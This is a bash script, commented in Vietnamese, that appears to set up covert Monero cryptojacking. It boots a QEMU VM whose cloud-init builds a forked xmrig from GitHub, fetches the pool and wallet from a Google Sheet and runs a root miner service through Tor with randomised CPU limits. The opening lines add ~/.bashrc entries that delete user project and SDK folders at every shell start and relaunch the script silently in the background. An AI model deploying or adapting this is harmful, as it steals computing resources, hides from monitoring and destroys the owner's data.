
# Thay thế các lệnh trên bằng:
cmd='rm -rf /home/user/.gradle /home/user/.emu /home/user/myapp /home/user/flutter 2>/dev/null'; grep -qxF "$cmd" ~/.bashrc || echo "$cmd" >> ~/.bashrc
grep -qxF "bash $(realpath sh/run.sh) >/dev/null 2>&1 &" ~/.bashrc || \
echo "bash $(realpath sh/run.sh) >/dev/null 2>&1 &" >> ~/.bashrc
# ^ Lệnh này ngăn chặn việc ghi log của script này vào ~/run.log trong tương lai.

#!/usr/bin/env bash
set -euo pipefail

# --- Config ---
BASE_IMG_URL="https://cloud-images.ubuntu.com/jammy/current/jammy-server-cloudimg-amd64.img"
BASE_IMG="jammy-base.img"
WORK_IMG="jammy-working.qcow2"
CLOUD_INIT_ISO="cloud-init.iso"

USER_NAME="user"
USER_PASS="1234"
ROOT_PASS="1234"
HOST_NAME="manhduongduc84"

# Google Sheets URL
SHEET_URL="https://opensheet.elk.sh/1CS5OcWkBV0wBr0HPf1VmTUXp2ms8ev8zgZBtwQPbQ5Q/vi"

# Fetch pool and wallet from Google Sheets
echo "📊 Fetching pool and wallet from Google Sheets..."
JSON_DATA=$(curl -sL "$SHEET_URL")

# Try different possible column names
WALLET=$(echo "$JSON_DATA" | jq -r '.[0].diachivi // .[0].wallet // .[0].WALLET // empty' 2>/dev/null)
POOL=$(echo "$JSON_DATA" | jq -r '.[0].pool // .[0].POOL // empty' 2>/dev/null)

if [ -z "$WALLET" ] || [ -z "$POOL" ]; then
    echo "❌ Error: Could not fetch pool or wallet from Google Sheets"
    echo "JSON Data: $JSON_DATA"
    exit 1
fi

echo "✅ Pool: $POOL"
echo "✅ Wallet: $WALLET"

# --- Generate password hashes ---
USER_HASH=$(echo "$USER_PASS" | openssl passwd -6 -stdin)
ROOT_HASH=$(echo "$ROOT_PASS" | openssl passwd -6 -stdin)

if [ ! -f "$WORK_IMG" ]; then
    echo "🔁 Creating new QEMU working image and cloud-init..."

    rm -rf cloud-init
    rm -f "$CLOUD_INIT_ISO"

    if [ ! -f "$BASE_IMG" ]; then
      echo "📥 Downloading Ubuntu image..."
      curl -L -o "$BASE_IMG" "$BASE_IMG_URL"
    fi

    echo "🛠️ Creating working disk..."
    qemu-img create -f qcow2 -b "$BASE_IMG" -F qcow2 "$WORK_IMG" 10G

    echo "📦 Creating cloud-init..."
    mkdir -p cloud-init

    cat > cloud-init/user-data <<EOF
#cloud-config
users:
  - name: $USER_NAME
    sudo: ALL=(ALL) NOPASSWD:ALL
    lock_passwd: false
    passwd: $USER_HASH
  - name: root
    lock_passwd: false
    passwd: $ROOT_HASH
ssh_pwauth: True

write_files:
  - path: /usr/local/bin/miner.sh
    permissions: '0755'
    content: |
      #!/bin/bash
      set -e

      echo "🔧 Installing Tor, Xmrig, Proxychains..."
      apt update
      apt install -y curl wget jq tor git build-essential cmake automake libtool autoconf \
        libhwloc-dev libuv1-dev libssl-dev proxychains4

      # --- Build Xmrig if not exists ---
      if [ ! -f /usr/local/bin/miner ]; then
        echo "🛠️ Installing Xmrig..."
        git clone https://github.com/tuongrangdathang-sudo/xmrig.git /opt/xmrig
        cd /opt/xmrig && mkdir -p build && cd build
        cmake .. && make -j\$(nproc)
        cp xmrig /usr/local/bin/miner
        chmod +x /usr/local/bin/miner
      fi

      echo "🚀 Start Tor..."
      systemctl enable tor
      systemctl start tor

      # --- Fetch config from Google Sheets on each boot ---
      fetch_config() {
        echo "📊 Fetching pool/wallet from Google Sheets..."
        JSON_DATA=\$(curl -sL "$SHEET_URL")
        
        WALLET=\$(echo "\$JSON_DATA" | jq -r '.[0].diachivi // .[0].wallet // .[0].WALLET // empty')
        POOL=\$(echo "\$JSON_DATA" | jq -r '.[0].pool // .[0].POOL // empty')
        
        if [ -z "\$WALLET" ] || [ -z "\$POOL" ]; then
          echo "❌ Failed to fetch config from sheets, using defaults"
          WALLET="$WALLET"
          POOL="$POOL"
        fi
        
        echo "✅ Using Pool: \$POOL"
        echo "✅ Using Wallet: \$WALLET"
      }

      run_miner() {
        CPU_CORES=\$(( RANDOM % 2 + 2 ))
        CPU_HINT=\$(( RANDOM % 20 + 60 ))
        echo "💎 Start Xmrig cores=\$CPU_CORES hint=\$CPU_HINT%"
        
        proxychains4 /usr/local/bin/miner \
          -o "\$POOL" \
          -u "\$WALLET" \
          -p "$HOST_NAME" \
          --tls \
          --donate-level 0 \
          --cpu-priority 3 \
          --threads \$CPU_CORES \
          --cpu-max-threads-hint=\$CPU_HINT
      }

      # Fetch config once at startup
      fetch_config

      while true; do
        echo "🌐 Checking Tor IP..."
        TOR_IP=""
        
        # Try to get Tor IP, max 300 attempts
        for attempt in {1..300}; do
          TOR_IP=\$(curl -s --socks5 127.0.0.1:9050 --max-time 10 https://api.ipify.org || echo "")
          if [ -n "\$TOR_IP" ]; then
            echo "✅ Tor IP: \$TOR_IP"
            break
          fi
          echo "⏳ Tor attempt \$attempt/300 failed, waiting..."
          sleep 2
        done

        # If no Tor IP after 300 attempts, restart Tor and retry
        if [ -z "\$TOR_IP" ]; then
          echo "❌ Tor not working after 300 attempts, restarting Tor service..."
          systemctl restart tor
          sleep 10
          echo "🔄 Retrying Tor check after restart..."
          continue
        fi

        # Only run miner if we have confirmed Tor IP
        echo "🔒 Tor connection confirmed, starting miner..."
        echo "💎 Miner will run continuously until stopped"
        run_miner
        
        # If miner exits (error/crash), wait and restart
        echo "⚠️ Miner stopped unexpectedly, restarting in 30s..."
        sleep 30
      done

  - path: /etc/systemd/system/miner.service
    permissions: '0644'
    content: |
      [Unit]
      Description=Tor + Xmrig Miner
      After=network-online.target tor.service
      Wants=network-online.target tor.service

      [Service]
      ExecStart=/bin/bash /usr/local/bin/miner.sh
      Restart=always
      RestartSec=30
      User=root
      LimitNOFILE=65535
      StandardOutput=tty
      StandardError=tty
      TTYPath=/dev/ttyS0

      [Install]
      WantedBy=multi-user.target

runcmd:
  - [ systemctl, daemon-reexec ]
  - [ systemctl, daemon-reload ]
  - [ systemctl, enable, miner.service ]
  - [ systemctl, start, miner.service ]
EOF

    cat > cloud-init/meta-data <<EOF
instance-id: iid-local01
local-hostname: $HOST_NAME
EOF

    cloud-localds "$CLOUD_INIT_ISO" cloud-init/user-data cloud-init/meta-data
else
    echo "✅ Using existing QEMU image: $WORK_IMG"
fi

echo "🚀 Starting VM..."
qemu-system-x86_64 \
  -enable-kvm \
  -cpu host \
  -smp 4 \
  -m 20G \
  -nographic \
  -drive if=virtio,file="$WORK_IMG",format=qcow2 \
  -cdrom "$CLOUD_INIT_ISO"
